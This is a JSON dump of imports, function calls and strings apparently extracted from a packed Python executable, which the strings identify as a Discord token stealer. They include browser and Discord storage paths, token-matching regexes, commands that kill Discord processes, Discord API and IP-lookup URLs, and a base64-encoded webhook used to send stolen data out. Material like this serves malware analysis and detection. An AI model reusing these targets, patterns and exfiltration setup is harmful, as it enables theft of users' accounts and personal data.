{
    "imports": [
        "*",
        "imp",
        "listdir",
        "dyld",
        "copyfile",
        "thread",
        "exit",
        "sqlite3",
        "sys",
        "re",
        "pyimod03_importers",
        "warnings",
        "pyimod00_crypto_key",
        "os",
        "randint",
        "shutil",
        "_thread",
        "__doc__",
        "loads",
        "post",
        "ssl",
        "encodings",
        "struct",
        "LibraryLoader",
        "_clearcache",
        "zlib",
        "DEFAULT_MODE",
        "marshal",
        "_frozen_importlib",
        "get",
        "b64decode",
        "environ",
        "ctypes"
    ],
    "function_calls": [
        "NullWriter",
        "_frozen_name",
        "read",
        "listdir",
        "cursor",
        "tell",
        "copyfile",
        "exit",
        "ArchiveReadError",
        "install",
        "isdir",
        "open",
        "findall",
        "hasattr",
        "get_ident",
        "connect",
        "os_path_dirname",
        "basename",
        "close",
        "__create_cipher",
        "rfind",
        "_import_aesmod",
        "fileno",
        "randint",
        "list",
        "os_listdir",
        "FilePos",
        "isabs",
        "abspath",
        "kill",
        "loads",
        "Cipher",
        "isfile",
        "new",
        "loadtoc",
        "mkdir",
        "__init__",
        "post",
        "fetchall",
        "walk",
        "int",
        "getenv",
        "rmtree",
        "exists",
        "insert",
        "replace",
        "zfill",
        "decrypt",
        "str",
        "ArchiveFile",
        "join",
        "LibraryLoader",
        "dict",
        "write",
        "len",
        "append",
        "decode",
        "local",
        "startswith",
        "keys",
        "os_path_basename",
        "seek",
        "checkmagic",
        "unpack",
        "ImportError",
        "system",
        "getpid",
        "type",
        "get",
        "super",
        "range",
        "b64decode",
        "execute",
        "get_default_verify_paths",
        "decompress",
        "get_magic"
    ],
    "strings": [
        "",
        "Firefox",
        "No os specific module found",
        "%s is not a valid %s archive file",
        "fields",
        "Opera Browser",
        "\n        Overridable.\n        Check to see if the file object self.lib actually has a file\n        we understand.\n        ",
        ")",
        "\"",
        "VIRTUAL_ENV",
        "MQ==",
        "https://api.ipify.org",
        "#",
        "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
        "avatar_url",
        "json",
        "https://cdn.discordapp.com/avatars/",
        "\n        Overridable.\n        Default: After magic comes an int (4 byte native) giving the\n        position of the TOC within self.lib.\n        Default: The TOC is a marshal-able string.\n        ",
        "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
        "phone",
        "id",
        "pack_into",
        "Nitro Classic",
        "PYTHONCASEOK",
        "icon_url",
        "\nNitro Type: ",
        "\n        Tries to import the AES module from PyCrypto.\n\n        PyCrypto 2.4 and 2.6 uses different name of the AES extension.\n        ",
        "pack",
        "token\\vivaldi\\",
        "Crypto.Cipher._AES",
        "premium_type",
        "w+",
        "email",
        "UTF-8",
        "Brave",
        "errors",
        "%s has version mismatch to dll",
        "value",
        "taskkill /im DiscordCanary.exe /f",
        "\n    ZlibArchive - an archive with compressed entries. Archive is read\n    from the executable created by PyInstaller.\n\n    This archive is used for bundling python modules inside the executable.\n\n    NOTE: The whole ZlibArchive (PYZ) is compressed so it is not necessary\n          to compress single modules with zlib.\n    ",
        "\n    A base class for a repository of python code objects.\n    The extract method is used by imputil.ArchiveImporter\n    to get code objects by name (fully qualified name), so\n    an enduser \"import a.b\" would become\n      extract('a.__init__')\n      extract('a.b')\n    ",
        "\n        Return a list of the contents\n        Default implementation assumes self.toc is a dict like object.\n        Not required by ArchiveImporter.\n        ",
        "User Info",
        "name",
        "Content-Type",
        "frozen",
        "SSL_CERT_FILE",
        "\nEmail: ",
        "\nPC Name: ",
        "embeds",
        "Authorization",
        "token\\firefox\\",
        "https://canary.discordapp.com/api/v6/users/@me",
        "ignore",
        "username",
        "Discord Canary",
        "Vivaldi",
        "\\",
        "inline",
        "application/json",
        "\n        Make this class act like a file, by invoking most methods on its\n        underlying file object.\n        ",
        "certifi",
        "\\Mozilla\\Firefox\\Profiles\\",
        "darwin",
        "Nitro With Games",
        "author",
        "url",
        "PC Info",
        "Google Chrome",
        "token\\opera\\",
        "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
        "rb",
        "\n        Return an instance of FilePos for the current thread. This is a crude\n        # re-implementation of threading.local, which isn't a built-in module\n        # and therefore isn't available.\n        ",
        "token\\",
        "/\\",
        "Failed to load dynlib/dll %r. Most probably this dynlib/dll was not found when the application was frozen.",
        "iter_unpack",
        "nt",
        "\n    This class keeps track of the file object representing and current position\n    in a file.\n    ",
        "\n        Initialize an Archive. If path is omitted, it will be an empty Archive.\n        ",
        "Discord",
        "!i",
        "?",
        "calcsize",
        "token\\brave\\",
        "error",
        "COMPUTERNAME",
        "Fatal Error.",
        "\n        Close file and record pos.\n        ",
        "Token:",
        "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
        "color",
        "cacert.pem",
        "true",
        "taskkill /im Discord.exe /f",
        "description",
        "\nToken Location: ",
        "token\\yandex\\",
        "Yandex Browser",
        "\nPhone: ",
        "unpack",
        "token\\ptb\\",
        "token\\chrome\\",
        "087125e1-f1cf-4d54-a088-109ee7424227",
        "title",
        "\\temp\\",
        "\\discordptb\\Local Storage\\leveldb\\",
        "SELECT key, value FROM webappsstore2",
        "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODE3MzQ1MDE5MTU3MjgyODE2L1c4aTRZdkFCcnBVT3I1eXR4dExtWGc2UWo2eUxJeWRYTFZhVGowTWpXaWlkT1BhQVhKVW8yLThNY09vRWZwQUtQNklZ",
        "IP: ",
        "/",
        "webappsstore.sqlite",
        ".jpg",
        "win",
        "posix",
        "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
        "token",
        "\n        Open file and seek to pos record from last close.\n        ",
        "[a-zA-Z0-9_-]{24}\\.[a-zA-Z0-9_-]{6}\\.[a-zA-Z0-9_-]{27}",
        "\n    This class is used only to decrypt Python modules.\n    ",
        "token\\discord\\",
        ":",
        " (",
        "Username: ",
        "\n    File class support auto open when access member from file object\n    This class is use to avoid file locking on windows\n    ",
        "\\Discord\\Local Storage\\leveldb\\",
        ".default",
        "\n        Get the object corresponding to name, or None.\n        For use with imputil ArchiveImporter, object is a python code object.\n        'name' is the name as specified in an 'import name'.\n        'import a.b' will become:\n        extract('a') (return None because 'a' is not a code object)\n        extract('a.__init__') (return a code object)\n        extract('a.b') (return a code object)\n        Default implementation:\n          self.toc is a dict\n          self.toc[name] is pos\n          self.lib has the code object marshal-ed at pos\n        ",
        "eggs",
        "\nSet up 'os' and 'os.path' module replacement functions for use during import\nbootstrap.\n",
        "mfa\\.[a-zA-Z0-9_-]{84}",
        ".log",
        "taskkill /im DiscordPTB.exe /f",
        "token\\canary\\",
        "\\discordcanary\\Local Storage\\leveldb\\",
        "LOCALAPPDATA",
        "None",
        "avatar",
        "unpack_from",
        "PYZ entry '%s' failed to unmarshal",
        "headers",
        "APPDATA",
        "Discord PTB",
        "discriminator",
        "Struct"
    ]
}